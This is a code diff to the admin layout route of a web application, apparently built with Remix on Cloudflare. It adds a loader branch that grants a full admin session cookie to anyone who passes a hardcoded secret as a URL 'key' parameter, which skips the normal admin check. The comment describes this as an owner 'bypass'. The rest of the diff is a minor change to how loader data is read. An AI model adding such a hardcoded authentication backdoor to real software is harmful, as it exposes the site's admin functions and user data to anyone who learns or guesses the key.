@@ -14,10 +14,30 @@ import {
   LogOut
 } from "lucide-react";
 import { getAllRequests } from "~/db/d1.server";
-import { requireAdmin, destroyAdminSession } from "~/utils/auth.server";
+import { requireAdmin, destroyAdminSession, sessionStorage } from "~/utils/auth.server";
 
 export async function loader({ request, context }: LoaderFunctionArgs) {
   const url = new URL(request.url);
+  const key = url.searchParams.get("key");
+
+  // Direct owner access bypass via secret key
+  if (key === "missmalli2026") {
+    const session = await sessionStorage.getSession();
+    session.set("adminLoggedIn", true);
+    session.set("adminUser", "admin");
+    const headers = new Headers();
+    headers.append("Set-Cookie", await sessionStorage.commitSession(session));
+
+    const env = (context as any)?.cloudflare?.env;
+    let needsReplyCount = 0;
+    try {
+      const requests = await getAllRequests(env);
+      needsReplyCount = (Array.isArray(requests) ? requests : []).filter((r) => r?.status === "needs_reply").length;
+    } catch {}
+
+    return json({ needsReplyCount }, { headers });
+  }
+
   if (url.pathname === "/admin/login") {
     return json({ needsReplyCount: 0 });
   }
@@ -47,7 +67,8 @@ export async function action({ request }: ActionFunctionArgs) {
 }
 
 export default function AdminLayout() {
-  const { needsReplyCount } = useLoaderData<typeof loader>();
+  const loaderData = useLoaderData<typeof loader>();
+  const needsReplyCount = Number(loaderData?.needsReplyCount || 0);
   const location = useLocation();
   const currentPath = location.pathname;
   const [mobileDrawerOpen, setMobileDrawerOpen] = useState(false);
